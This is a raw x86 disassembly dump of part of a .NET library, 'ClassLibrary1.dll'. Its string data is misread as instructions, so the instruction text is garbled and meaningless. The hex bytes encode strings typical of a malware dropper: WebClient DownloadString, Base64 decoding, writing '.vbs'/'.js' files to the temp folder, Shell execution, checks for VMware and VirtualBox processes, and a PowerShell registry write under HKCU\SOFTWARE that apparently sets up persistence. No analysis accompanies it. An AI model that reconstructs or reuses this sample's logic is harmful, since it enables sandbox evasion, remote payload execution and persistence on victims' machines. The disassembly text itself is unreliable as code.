10002c0c:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
10002c0f:	54                   	push   %esp
10002c10:	79 70                	jns    0x10002c82
10002c12:	65 00 47 65          	add    %al,%gs:0x65(%edi)
10002c16:	74 54                	je     0x10002c6c
10002c18:	79 70                	jns    0x10002c8a
10002c1a:	65 00 4d 65          	add    %cl,%gs:0x65(%ebp)
10002c1e:	74 68                	je     0x10002c88
10002c20:	6f                   	outsl  %ds:(%esi),(%dx)
10002c21:	64 42                	fs inc %edx
10002c23:	61                   	popa
10002c24:	73 65                	jae    0x10002c8b
10002c26:	00 53 74             	add    %dl,0x74(%ebx)
10002c29:	72 52                	jb     0x10002c7d
10002c2b:	65 76 65             	gs jbe 0x10002c93
10002c2e:	72 73                	jb     0x10002ca3
10002c30:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002c34:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002c3b:	62 
10002c3c:	75 74                	jne    0x10002cb2
10002c3e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002c43:	75 67                	jne    0x10002cac
10002c45:	67 61                	addr16 popa
10002c47:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002c4b:	74 74                	je     0x10002cc1
10002c4d:	72 69                	jb     0x10002cb8
10002c4f:	62 75 74             	bound  %esi,0x74(%ebp)
10002c52:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002c56:	6d                   	insl   (%dx),%es:(%edi)
10002c57:	56                   	push   %esi
10002c58:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002c5f:	74 74                	je     0x10002cd5
10002c61:	72 69                	jb     0x10002ccc
10002c63:	62 75 74             	bound  %esi,0x74(%ebp)
10002c66:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002c6a:	73 65                	jae    0x10002cd1
10002c6c:	6d                   	insl   (%dx),%es:(%edi)
10002c6d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002c71:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002c78:	72 
10002c79:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002c80:	73 73                	jae    0x10002cf5
10002c82:	65 6d                	gs insl (%dx),%es:(%edi)
10002c84:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002c88:	72 61                	jb     0x10002ceb
10002c8a:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002c8d:	61                   	popa
10002c8e:	72 6b                	jb     0x10002cfb
10002c90:	41                   	inc    %ecx
10002c91:	74 74                	je     0x10002d07
10002c93:	72 69                	jb     0x10002cfe
10002c95:	62 75 74             	bound  %esi,0x74(%ebp)
10002c98:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002c9d:	67 65 74 46          	addr16 gs je 0x10002ce7
10002ca1:	72 61                	jb     0x10002d04
10002ca3:	6d                   	insl   (%dx),%es:(%edi)
10002ca4:	65 77 6f             	gs ja  0x10002d16
10002ca7:	72 6b                	jb     0x10002d14
10002ca9:	41                   	inc    %ecx
10002caa:	74 74                	je     0x10002d20
10002cac:	72 69                	jb     0x10002d17
10002cae:	62 75 74             	bound  %esi,0x74(%ebp)
10002cb1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002cb5:	73 65                	jae    0x10002d1c
10002cb7:	6d                   	insl   (%dx),%es:(%edi)
10002cb8:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002cbc:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002cc3:	69 
10002cc4:	6f                   	outsl  %ds:(%esi),(%dx)
10002cc5:	6e                   	outsb  %ds:(%esi),(%dx)
10002cc6:	41                   	inc    %ecx
10002cc7:	74 74                	je     0x10002d3d
10002cc9:	72 69                	jb     0x10002d34
10002ccb:	62 75 74             	bound  %esi,0x74(%ebp)
10002cce:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002cd2:	73 65                	jae    0x10002d39
10002cd4:	6d                   	insl   (%dx),%es:(%edi)
10002cd5:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002cd9:	65 73 63             	gs jae 0x10002d3f
10002cdc:	72 69                	jb     0x10002d47
10002cde:	70 74                	jo     0x10002d54
10002ce0:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002ce7:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002cee:	6f                   	outsl  %ds:(%esi),(%dx)
10002cef:	6d                   	insl   (%dx),%es:(%edi)
10002cf0:	70 69                	jo     0x10002d5b
10002cf2:	6c                   	insb   (%dx),%es:(%edi)
10002cf3:	61                   	popa
10002cf4:	74 69                	je     0x10002d5f
10002cf6:	6f                   	outsl  %ds:(%esi),(%dx)
10002cf7:	6e                   	outsb  %ds:(%esi),(%dx)
10002cf8:	52                   	push   %edx
10002cf9:	65 6c                	gs insb (%dx),%es:(%edi)
10002cfb:	61                   	popa
10002cfc:	78 61                	js     0x10002d5f
10002cfe:	74 69                	je     0x10002d69
10002d00:	6f                   	outsl  %ds:(%esi),(%dx)
10002d01:	6e                   	outsb  %ds:(%esi),(%dx)
10002d02:	73 41                	jae    0x10002d45
10002d04:	74 74                	je     0x10002d7a
10002d06:	72 69                	jb     0x10002d71
10002d08:	62 75 74             	bound  %esi,0x74(%ebp)
10002d0b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002d0f:	73 65                	jae    0x10002d76
10002d11:	6d                   	insl   (%dx),%es:(%edi)
10002d12:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002d16:	72 6f                	jb     0x10002d87
10002d18:	64 75 63             	fs jne 0x10002d7e
10002d1b:	74 41                	je     0x10002d5e
10002d1d:	74 74                	je     0x10002d93
10002d1f:	72 69                	jb     0x10002d8a
10002d21:	62 75 74             	bound  %esi,0x74(%ebp)
10002d24:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002d28:	73 65                	jae    0x10002d8f
10002d2a:	6d                   	insl   (%dx),%es:(%edi)
10002d2b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002d2f:	6f                   	outsl  %ds:(%esi),(%dx)
10002d30:	70 79                	jo     0x10002dab
10002d32:	72 69                	jb     0x10002d9d
10002d34:	67 68 74 41 74 74    	addr16 push $0x74744174
10002d3a:	72 69                	jb     0x10002da5
10002d3c:	62 75 74             	bound  %esi,0x74(%ebp)
10002d3f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002d43:	73 65                	jae    0x10002daa
10002d45:	6d                   	insl   (%dx),%es:(%edi)
10002d46:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002d4a:	6f                   	outsl  %ds:(%esi),(%dx)
10002d4b:	6d                   	insl   (%dx),%es:(%edi)
10002d4c:	70 61                	jo     0x10002daf
10002d4e:	6e                   	outsb  %ds:(%esi),(%dx)
10002d4f:	79 41                	jns    0x10002d92
10002d51:	74 74                	je     0x10002dc7
10002d53:	72 69                	jb     0x10002dbe
10002d55:	62 75 74             	bound  %esi,0x74(%ebp)
10002d58:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002d5c:	6e                   	outsb  %ds:(%esi),(%dx)
10002d5d:	74 69                	je     0x10002dc8
10002d5f:	6d                   	insl   (%dx),%es:(%edi)
10002d60:	65 43                	gs inc %ebx
10002d62:	6f                   	outsl  %ds:(%esi),(%dx)
10002d63:	6d                   	insl   (%dx),%es:(%edi)
10002d64:	70 61                	jo     0x10002dc7
10002d66:	74 69                	je     0x10002dd1
10002d68:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002d6b:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002d72:	69 
10002d73:	62 75 74             	bound  %esi,0x74(%ebp)
10002d76:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
10002d7a:	73 74                	jae    0x10002df0
10002d7c:	65 6d                	gs insl (%dx),%es:(%edi)
10002d7e:	2e 54                	cs push %esp
10002d80:	68 72 65 61 64       	push   $0x64616572
10002d85:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
10002d8c:	5f                   	pop    %edi
10002d8d:	45                   	inc    %ebp
10002d8e:	6e                   	outsb  %ds:(%esi),(%dx)
10002d8f:	63 6f 64             	arpl   %ebp,0x64(%edi)
10002d92:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
10002d99:	74 65                	je     0x10002e00
10002d9b:	6d                   	insl   (%dx),%es:(%edi)
10002d9c:	2e 52                	cs push %edx
10002d9e:	75 6e                	jne    0x10002e0e
10002da0:	74 69                	je     0x10002e0b
10002da2:	6d                   	insl   (%dx),%es:(%edi)
10002da3:	65 2e 56             	gs cs push %esi
10002da6:	65 72 73             	gs jb  0x10002e1c
10002da9:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10002db0:	46                   	inc    %esi
10002db1:	72 6f                	jb     0x10002e22
10002db3:	6d                   	insl   (%dx),%es:(%edi)
10002db4:	42                   	inc    %edx
10002db5:	61                   	popa
10002db6:	73 65                	jae    0x10002e1d
10002db8:	36 34 53             	ss xor $0x53,%al
10002dbb:	74 72                	je     0x10002e2f
10002dbd:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
10002dc4:	6e                   	outsb  %ds:(%esi),(%dx)
10002dc5:	6c                   	insb   (%dx),%es:(%edi)
10002dc6:	6f                   	outsl  %ds:(%esi),(%dx)
10002dc7:	61                   	popa
10002dc8:	64 53                	fs push %ebx
10002dca:	74 72                	je     0x10002e3e
10002dcc:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
10002dd3:	74 72                	je     0x10002e47
10002dd5:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10002ddc:	54                   	push   %esp
10002ddd:	65 6d                	gs insl (%dx),%es:(%edi)
10002ddf:	70 50                	jo     0x10002e31
10002de1:	61                   	popa
10002de2:	74 68                	je     0x10002e4c
10002de4:	00 65 4d             	add    %ah,0x4d(%ebp)
10002de7:	4f                   	dec    %edi
10002de8:	7a 4d                	jp     0x10002e37
10002dea:	42                   	inc    %edx
10002deb:	6c                   	insb   (%dx),%es:(%edi)
10002dec:	00 43 6c             	add    %al,0x6c(%ebx)
10002def:	61                   	popa
10002df0:	73 73                	jae    0x10002e65
10002df2:	4c                   	dec    %esp
10002df3:	69 62 72 61 72 79 31 	imul   $0x31797261,0x72(%edx),%esp
10002dfa:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10002dfd:	6c                   	insb   (%dx),%es:(%edi)
10002dfe:	00 53 68             	add    %dl,0x68(%ebx)
10002e01:	65 6c                	gs insb (%dx),%es:(%edi)
10002e03:	6c                   	insb   (%dx),%es:(%edi)
10002e04:	00 73 65             	add    %dh,0x65(%ebx)
10002e07:	74 5f                	je     0x10002e68
10002e09:	53                   	push   %ebx
10002e0a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
10002e0e:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
10002e15:	6f 
10002e16:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
10002e19:	00 53 79             	add    %dl,0x79(%ebx)
10002e1c:	73 74                	jae    0x10002e92
10002e1e:	65 6d                	gs insl (%dx),%es:(%edi)
10002e20:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
10002e24:	6d                   	insl   (%dx),%es:(%edi)
10002e25:	00 41 70             	add    %al,0x70(%ecx)
10002e28:	70 44                	jo     0x10002e6e
10002e2a:	6f                   	outsl  %ds:(%esi),(%dx)
10002e2b:	6d                   	insl   (%dx),%es:(%edi)
10002e2c:	61                   	popa
10002e2d:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
10002e34:	43                   	inc    %ebx
10002e35:	75 72                	jne    0x10002ea9
10002e37:	72 65                	jb     0x10002e9e
10002e39:	6e                   	outsb  %ds:(%esi),(%dx)
10002e3a:	74 44                	je     0x10002e80
10002e3c:	6f                   	outsl  %ds:(%esi),(%dx)
10002e3d:	6d                   	insl   (%dx),%es:(%edi)
10002e3e:	61                   	popa
10002e3f:	69 6e 00 49 6e 74 65 	imul   $0x65746e49,0x0(%esi),%ebp
10002e46:	72 61                	jb     0x10002ea9
10002e48:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
10002e4c:	6e                   	outsb  %ds:(%esi),(%dx)
10002e4d:	00 53 79             	add    %dl,0x79(%ebx)
10002e50:	73 74                	jae    0x10002ec6
10002e52:	65 6d                	gs insl (%dx),%es:(%edi)
10002e54:	2e 52                	cs push %edx
10002e56:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
10002e59:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002e5e:	6e                   	outsb  %ds:(%esi),(%dx)
10002e5f:	00 45 78             	add    %al,0x78(%ebp)
10002e62:	63 65 70             	arpl   %esp,0x70(%ebp)
10002e65:	74 69                	je     0x10002ed0
10002e67:	6f                   	outsl  %ds:(%esi),(%dx)
10002e68:	6e                   	outsb  %ds:(%esi),(%dx)
10002e69:	00 4d 65             	add    %cl,0x65(%ebp)
10002e6c:	74 68                	je     0x10002ed6
10002e6e:	6f                   	outsl  %ds:(%esi),(%dx)
10002e6f:	64 49                	fs dec %ecx
10002e71:	6e                   	outsb  %ds:(%esi),(%dx)
10002e72:	66 6f                	outsw  %ds:(%esi),(%dx)
10002e74:	00 46 69             	add    %al,0x69(%esi)
10002e77:	6c                   	insb   (%dx),%es:(%edi)
10002e78:	65 49                	gs dec %ecx
10002e7a:	6e                   	outsb  %ds:(%esi),(%dx)
10002e7b:	66 6f                	outsw  %ds:(%esi),(%dx)
10002e7d:	00 4d 65             	add    %cl,0x65(%ebp)
10002e80:	6d                   	insl   (%dx),%es:(%edi)
10002e81:	62 65 72             	bound  %esp,0x72(%ebp)
10002e84:	49                   	dec    %ecx
10002e85:	6e                   	outsb  %ds:(%esi),(%dx)
10002e86:	66 6f                	outsw  %ds:(%esi),(%dx)
10002e88:	00 53 65             	add    %dl,0x65(%ebx)
10002e8b:	72 76                	jb     0x10002f03
10002e8d:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%ebx),%esp
10002e94:	74 4d                	je     0x10002ee3
10002e96:	61                   	popa
10002e97:	6e                   	outsb  %ds:(%esi),(%dx)
10002e98:	61                   	popa
10002e99:	67 65 72 00          	addr16 gs jb 0x10002e9d
10002e9d:	41                   	inc    %ecx
10002e9e:	73 73                	jae    0x10002f13
10002ea0:	65 6d                	gs insl (%dx),%es:(%edi)
10002ea2:	62 6c 79 4c          	bound  %ebp,0x4c(%ecx,%edi,2)
10002ea6:	6f                   	outsl  %ds:(%esi),(%dx)
10002ea7:	61                   	popa
10002ea8:	64 45                	fs inc %ebp
10002eaa:	76 65                	jbe    0x10002f11
10002eac:	6e                   	outsb  %ds:(%esi),(%dx)
10002ead:	74 48                	je     0x10002ef7
10002eaf:	61                   	popa
10002eb0:	6e                   	outsb  %ds:(%esi),(%dx)
10002eb1:	64 6c                	fs insb (%dx),%es:(%edi)
10002eb3:	65 72 00             	gs jb  0x10002eb6
10002eb6:	54                   	push   %esp
10002eb7:	6f                   	outsl  %ds:(%esi),(%dx)
10002eb8:	55                   	push   %ebp
10002eb9:	70 70                	jo     0x10002f2b
10002ebb:	65 72 00             	gs jb  0x10002ebe
10002ebe:	45                   	inc    %ebp
10002ebf:	6e                   	outsb  %ds:(%esi),(%dx)
10002ec0:	74 65                	je     0x10002f27
10002ec2:	72 00                	jb     0x10002ec4
10002ec4:	54                   	push   %esp
10002ec5:	6f                   	outsl  %ds:(%esi),(%dx)
10002ec6:	4c                   	dec    %esp
10002ec7:	6f                   	outsl  %ds:(%esi),(%dx)
10002ec8:	77 65                	ja     0x10002f2f
10002eca:	72 00                	jb     0x10002ecc
10002ecc:	43                   	inc    %ebx
10002ecd:	6c                   	insb   (%dx),%es:(%edi)
10002ece:	65 61                	gs popa
10002ed0:	72 50                	jb     0x10002f22
10002ed2:	72 6f                	jb     0x10002f43
10002ed4:	6a 65                	push   $0x65
10002ed6:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
10002eda:	72 6f                	jb     0x10002f4b
10002edc:	72 00                	jb     0x10002ede
10002ede:	53                   	push   %ebx
10002edf:	65 74 50             	gs je  0x10002f32
10002ee2:	72 6f                	jb     0x10002f53
10002ee4:	6a 65                	push   $0x65
10002ee6:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
10002eea:	72 6f                	jb     0x10002f5b
10002eec:	72 00                	jb     0x10002eee
10002eee:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10002ef3:	00 2e                	add    %ch,(%esi)
10002ef5:	63 63 74             	arpl   %esp,0x74(%ebx)
10002ef8:	6f                   	outsl  %ds:(%esi),(%dx)
10002ef9:	72 00                	jb     0x10002efb
10002efb:	4d                   	dec    %ebp
10002efc:	6f                   	outsl  %ds:(%esi),(%dx)
10002efd:	6e                   	outsb  %ds:(%esi),(%dx)
10002efe:	69 74 6f 72 00 53 79 	imul   $0x73795300,0x72(%edi,%ebp,2),%esi
10002f05:	73 
10002f06:	74 65                	je     0x10002f6d
10002f08:	6d                   	insl   (%dx),%es:(%edi)
10002f09:	2e 44                	cs inc %esp
10002f0b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10002f12:	69 63 73 00 47 65 74 	imul   $0x74654700,0x73(%ebx),%esp
10002f19:	4d                   	dec    %ebp
10002f1a:	65 74 68             	gs je  0x10002f85
10002f1d:	6f                   	outsl  %ds:(%esi),(%dx)
10002f1e:	64 73 00             	fs jae 0x10002f21
10002f21:	53                   	push   %ebx
10002f22:	79 73                	jns    0x10002f97
10002f24:	74 65                	je     0x10002f8b
10002f26:	6d                   	insl   (%dx),%es:(%edi)
10002f27:	2e 52                	cs push %edx
10002f29:	75 6e                	jne    0x10002f99
10002f2b:	74 69                	je     0x10002f96
10002f2d:	6d                   	insl   (%dx),%es:(%edi)
10002f2e:	65 2e 49             	gs cs dec %ecx
10002f31:	6e                   	outsb  %ds:(%esi),(%dx)
10002f32:	74 65                	je     0x10002f99
10002f34:	72 6f                	jb     0x10002fa5
10002f36:	70 53                	jo     0x10002f8b
10002f38:	65 72 76             	gs jb  0x10002fb1
10002f3b:	69 63 65 73 00 4d 69 	imul   $0x694d0073,0x65(%ebx),%esp
10002f42:	63 72 6f             	arpl   %esi,0x6f(%edx)
10002f45:	73 6f                	jae    0x10002fb6
10002f47:	66 74 2e             	data16 je 0x10002f78
10002f4a:	56                   	push   %esi
10002f4b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
10002f52:	73 69                	jae    0x10002fbd
10002f54:	63 2e                	arpl   %ebp,(%esi)
10002f56:	43                   	inc    %ebx
10002f57:	6f                   	outsl  %ds:(%esi),(%dx)
10002f58:	6d                   	insl   (%dx),%es:(%edi)
10002f59:	70 69                	jo     0x10002fc4
10002f5b:	6c                   	insb   (%dx),%es:(%edi)
10002f5c:	65 72 53             	gs jb  0x10002fb2
10002f5f:	65 72 76             	gs jb  0x10002fd8
10002f62:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
10002f69:	73 74                	jae    0x10002fdf
10002f6b:	65 6d                	gs insl (%dx),%es:(%edi)
10002f6d:	2e 52                	cs push %edx
10002f6f:	75 6e                	jne    0x10002fdf
10002f71:	74 69                	je     0x10002fdc
10002f73:	6d                   	insl   (%dx),%es:(%edi)
10002f74:	65 2e 43             	gs cs inc %ebx
10002f77:	6f                   	outsl  %ds:(%esi),(%dx)
10002f78:	6d                   	insl   (%dx),%es:(%edi)
10002f79:	70 69                	jo     0x10002fe4
10002f7b:	6c                   	insb   (%dx),%es:(%edi)
10002f7c:	65 72 53             	gs jb  0x10002fd2
10002f7f:	65 72 76             	gs jb  0x10002ff8
10002f82:	69 63 65 73 00 43 6c 	imul   $0x6c430073,0x65(%ebx),%esp
10002f89:	61                   	popa
10002f8a:	73 73                	jae    0x10002fff
10002f8c:	4c                   	dec    %esp
10002f8d:	69 62 72 61 72 79 31 	imul   $0x31797261,0x72(%edx),%esp
10002f94:	2e 52                	cs push %edx
10002f96:	65 73 6f             	gs jae 0x10003008
10002f99:	75 72                	jne    0x1000300d
10002f9b:	63 65 73             	arpl   %esp,0x73(%ebp)
10002f9e:	2e 72 65             	jb,pn  0x10003006
10002fa1:	73 6f                	jae    0x10003012
10002fa3:	75 72                	jne    0x10003017
10002fa5:	63 65 73             	arpl   %esp,0x73(%ebp)
10002fa8:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
10002fac:	75 67                	jne    0x10003015
10002fae:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
10002fb5:	65 
10002fb6:	73 00                	jae    0x10002fb8
10002fb8:	47                   	inc    %edi
10002fb9:	65 74 4d             	gs je  0x10003009
10002fbc:	6f                   	outsl  %ds:(%esi),(%dx)
10002fbd:	64 75 6c             	fs jne 0x1000302c
10002fc0:	65 73 00             	gs jae 0x10002fc3
10002fc3:	47                   	inc    %edi
10002fc4:	65 74 50             	gs je  0x10003017
10002fc7:	72 6f                	jb     0x10003038
10002fc9:	63 65 73             	arpl   %esp,0x73(%ebp)
10002fcc:	73 65                	jae    0x10003033
10002fce:	73 00                	jae    0x10002fd0
10002fd0:	42                   	inc    %edx
10002fd1:	69 6e 64 69 6e 67 46 	imul   $0x46676e69,0x64(%esi),%ebp
10002fd8:	6c                   	insb   (%dx),%es:(%edi)
10002fd9:	61                   	popa
10002fda:	67 73 00             	addr16 jae 0x10002fdd
10002fdd:	53                   	push   %ebx
10002fde:	74 72                	je     0x10003052
10002fe0:	69 6e 67 73 00 41 73 	imul   $0x73410073,0x67(%esi),%ebp
10002fe7:	73 65                	jae    0x1000304e
10002fe9:	6d                   	insl   (%dx),%es:(%edi)
10002fea:	62 6c 79 4c          	bound  %ebp,0x4c(%ecx,%edi,2)
10002fee:	6f                   	outsl  %ds:(%esi),(%dx)
10002fef:	61                   	popa
10002ff0:	64 45                	fs inc %ebp
10002ff2:	76 65                	jbe    0x10003059
10002ff4:	6e                   	outsb  %ds:(%esi),(%dx)
10002ff5:	74 41                	je     0x10003038
10002ff7:	72 67                	jb     0x10003060
10002ff9:	73 00                	jae    0x10002ffb
10002ffb:	43                   	inc    %ebx
10002ffc:	6f                   	outsl  %ds:(%esi),(%dx)
10002ffd:	6e                   	outsb  %ds:(%esi),(%dx)
10002ffe:	74 61                	je     0x10003061
10003000:	69 6e 73 00 50 72 6f 	imul   $0x6f725000,0x73(%esi),%ebp
10003007:	63 65 73             	arpl   %esp,0x73(%ebp)
1000300a:	73 00                	jae    0x1000300c
1000300c:	43                   	inc    %ebx
1000300d:	6f                   	outsl  %ds:(%esi),(%dx)
1000300e:	6e                   	outsb  %ds:(%esi),(%dx)
1000300f:	63 61 74             	arpl   %esp,0x74(%ecx)
10003012:	00 4f 62             	add    %cl,0x62(%edi)
10003015:	6a 65                	push   $0x65
10003017:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
1000301b:	79 73                	jns    0x10003090
1000301d:	74 65                	je     0x10003084
1000301f:	6d                   	insl   (%dx),%es:(%edi)
10003020:	2e 4e                	cs dec %esi
10003022:	65 74 00             	gs je  0x10003025
10003025:	45                   	inc    %ebp
10003026:	78 69                	js     0x10003091
10003028:	74 00                	je     0x1000302a
1000302a:	4d                   	dec    %ebp
1000302b:	73 67                	jae    0x10003094
1000302d:	42                   	inc    %edx
1000302e:	6f                   	outsl  %ds:(%esi),(%dx)
1000302f:	78 52                	js     0x10003083
10003031:	65 73 75             	gs jae 0x100030a9
10003034:	6c                   	insb   (%dx),%es:(%edi)
10003035:	74 00                	je     0x10003037
10003037:	57                   	push   %edi
10003038:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
1000303c:	69 65 6e 74 00 43 6f 	imul   $0x6f430074,0x6e(%ebp),%esp
10003043:	6e                   	outsb  %ds:(%esi),(%dx)
10003044:	76 65                	jbe    0x100030ab
10003046:	72 74                	jb     0x100030bc
10003048:	00 53 79             	add    %dl,0x79(%ebx)
1000304b:	73 74                	jae    0x100030c1
1000304d:	65 6d                	gs insl (%dx),%es:(%edi)
1000304f:	2e 54                	cs push %esp
10003051:	65 78 74             	gs js  0x100030c8
10003054:	00 57 72             	add    %dl,0x72(%edi)
10003057:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
1000305e:	65 
1000305f:	78 74                	js     0x100030d5
10003061:	00 4d 73             	add    %cl,0x73(%ebp)
10003064:	67 42                	addr16 inc %edx
10003066:	6f                   	outsl  %ds:(%esi),(%dx)
10003067:	78 00                	js     0x10003069
10003069:	67 65 74 5f          	addr16 gs je 0x100030cc
1000306d:	4c                   	dec    %esp
1000306e:	6f                   	outsl  %ds:(%esi),(%dx)
1000306f:	61                   	popa
10003070:	64 65 64 41          	fs gs fs inc %ecx
10003074:	73 73                	jae    0x100030e9
10003076:	65 6d                	gs insl (%dx),%es:(%edi)
10003078:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
1000307c:	6f                   	outsl  %ds:(%esi),(%dx)
1000307d:	70 5f                	jo     0x100030de
1000307f:	45                   	inc    %ebp
10003080:	71 75                	jno    0x100030f7
10003082:	61                   	popa
10003083:	6c                   	insb   (%dx),%es:(%edi)
10003084:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
1000308b:	49 
1000308c:	6e                   	outsb  %ds:(%esi),(%dx)
1000308d:	65 71 75             	gs jno 0x10003105
10003090:	61                   	popa
10003091:	6c                   	insb   (%dx),%es:(%edi)
10003092:	69 74 79 00 45 6d 70 	imul   $0x74706d45,0x0(%ecx,%edi,2),%esi
10003099:	74 
1000309a:	79 00                	jns    0x1000309c
1000309c:	00 03                	add    %al,(%ebx)
1000309e:	34 00                	xor    $0x0,%al
100030a0:	00 11                	add    %dl,(%ecx)
100030a2:	76 00                	jbe    0x100030a4
100030a4:	6d                   	insl   (%dx),%es:(%edi)
100030a5:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
100030a9:	00 6f 00             	add    %ch,0x0(%edi)
100030ac:	6c                   	insb   (%dx),%es:(%edi)
100030ad:	00 73 00             	add    %dh,0x0(%ebx)
100030b0:	64 00 00             	add    %al,%fs:(%eax)
100030b3:	15 56 00 69 00       	adc    $0x690056,%eax
100030b8:	72 00                	jb     0x100030ba
100030ba:	74 00                	je     0x100030bc
100030bc:	75 00                	jne    0x100030be
100030be:	61                   	popa
100030bf:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
100030c3:	00 6f 00             	add    %ch,0x0(%edi)
100030c6:	78 00                	js     0x100030c8
100030c8:	00 07                	add    %al,(%edi)
100030ca:	76 00                	jbe    0x100030cc
100030cc:	62 00                	bound  %eax,(%eax)
100030ce:	73 00                	jae    0x100030d0
100030d0:	00 09                	add    %cl,(%ecx)
100030d2:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
100030d6:	62 00                	bound  %eax,(%eax)
100030d8:	73 00                	jae    0x100030da
100030da:	00 05 6a 00 73 00    	add    %al,0x73006a
100030e0:	00 07                	add    %al,(%edi)
100030e2:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
100030e6:	73 00                	jae    0x100030e8
100030e8:	00 03                	add    %al,(%ebx)
100030ea:	31 00                	xor    %eax,(%eax)
100030ec:	00 80 bb 24 00 74    	add    %al,0x740024bb(%eax)
100030f2:	00 65 00             	add    %ah,0x0(%ebp)
100030f5:	73 00                	jae    0x100030f7
100030f7:	74 00                	je     0x100030f9
100030f9:	65 00 20             	add    %ah,%gs:(%eax)
100030fc:	00 3d 00 20 00 4e    	add    %bh,0x4e002000
10003102:	00 65 00             	add    %ah,0x0(%ebp)
10003105:	77 00                	ja     0x10003107
10003107:	2d 00 49 00 74       	sub    $0x74004900,%eax
1000310c:	00 65 00             	add    %ah,0x0(%ebp)
1000310f:	6d                   	insl   (%dx),%es:(%edi)
10003110:	00 50 00             	add    %dl,0x0(%eax)
10003113:	72 00                	jb     0x10003115
10003115:	6f                   	outsl  %ds:(%esi),(%dx)
10003116:	00 70 00             	add    %dh,0x0(%eax)
10003119:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000311d:	74 00                	je     0x1000311f
1000311f:	79 00                	jns    0x10003121
10003121:	20 00                	and    %al,(%eax)
10003123:	2d 00 50 00 61       	sub    $0x61005000,%eax
10003128:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
1000312c:	00 20                	add    %ah,(%eax)
1000312e:	00 22                	add    %ah,(%edx)
10003130:	00 48 00             	add    %cl,0x0(%eax)
10003133:	4b                   	dec    %ebx
10003134:	00 43 00             	add    %al,0x0(%ebx)
10003137:	55                   	push   %ebp
10003138:	00 3a                	add    %bh,(%edx)
1000313a:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
1000313e:	00 4f 00             	add    %cl,0x0(%edi)
10003141:	46                   	inc    %esi
10003142:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10003146:	00 41 00             	add    %al,0x0(%ecx)
10003149:	52                   	push   %edx
1000314a:	00 45 00             	add    %al,0x0(%ebp)
